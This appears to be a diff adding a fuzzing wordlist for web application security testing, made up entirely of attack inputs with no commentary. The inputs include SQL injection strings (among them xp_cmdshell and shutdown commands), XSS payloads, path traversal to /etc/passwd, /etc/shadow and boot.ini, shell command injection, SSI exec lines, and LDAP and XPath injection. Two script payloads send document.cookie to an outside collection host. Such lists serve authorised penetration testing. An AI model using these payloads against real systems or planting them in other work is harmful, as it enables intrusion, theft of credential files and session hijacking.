@@ -1,0 +1,363 @@
+A
+TRUE
+FALSE
+0
+00
+1
+-1
+1.0
+-1.0
+2
+-2
+-20
+65536
+268435455
+-268435455
+2147483647
+0xfffffff
+NULL
+null
+\0
+\00
+%0a
+%00
++%00
+\0
+\0\0
+\0\0\0
+\00
+\00\00
+\00\00\00
+$null
+$NULL
+%
+#
+*
+}
+;
+/
+\
+\\
+\\/
+\\\\*
+\\\\?\\
+|
+`
+-
+--
+*|
+^'
+\'
+/'
+@'
+(')
+{'}
+[']
+*'
+#'
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+%01%02%03%04%0a%0d%0aADSF
+!@#0%^#0##018387@#0^^**(()
+%01%02%03%04%0a%0d%0aADSF
+\t
+"\t"
+&#10;
+&#13;
+&#10;&#13;
+&#13;&#10;
+#xD
+#xA
+#xD#xA
+#xA#xD
+/%00/
+%00/
+%00
+<?
+%3C%3F
+%60
+%5C
+%5C/
+%7C
+%00
+/%2A
+%2A
+%2C
+%20
+%20|
+%250a
+%2500
+../
+%2e%2e%2f
+..%u2215
+..%c0%af
+..%bg%qf
+..\
+..%5c
+..%%35c
+..%255c
+..%%35%63
+..%25%35%63
+..%u2216
+something%00html
+&apos;
+/&apos;
+\&apos;
+^&apos;
+@&apos;
+{&apos;}
+[&apos;]
+*&apos;
+#&apos;
+\"blah
+&quot;;id&quot;
+id%00
+id%00|
+<  script > < / script>
+">xxx<P>yyy
+"><script>"
+?x=
+?x="
+?x=|
+?x=>
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+/,%ENV,/
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+`id`
+;id;
+;read;
+;netstat -a;
+\nnetstat -a%\n
+|id|
+|id
+|ls
+|ls -la
+;ls -la
+|/bin/ls -al
+\n/bin/ls -al\n
+/index.html|id|
+`dir`
+|dir
+|dir|
+;dir
+%0d%0aX-Injection-Header:%20AttackValue
+/boot.ini
+/etc/passwd
+/etc/shadow
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+C:/boot.ini
+C:\boot.ini
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/hosts
+../../boot.ini
+/../../../../../../../../%2A
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/shadow
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%00/etc/passwd%00
+%00/etc/shadow%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd%00.html
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+../../../../../../../../conf/server.xml
+/../../../../../../../../bin/id|
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/.../.../.../.../.../
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+%3cscript%3ealert("XSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('XSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2Fsec.neurofuzz-software.com%2Fe4589efff654d91e26b43333dbf41425%2Fcatch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+'
+"
+#
+-
+--
+' --
+--';
+' ;
+= '
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+admin'--
+';shutdown--
+<>"'%;)(&+
+' or ''='
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+/
+//
+//*
+*/*
+@*
+x' or name()='username' or 'x'='y
+count(/child::node())
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<name>','')); phpinfo(); exit;/*</name>
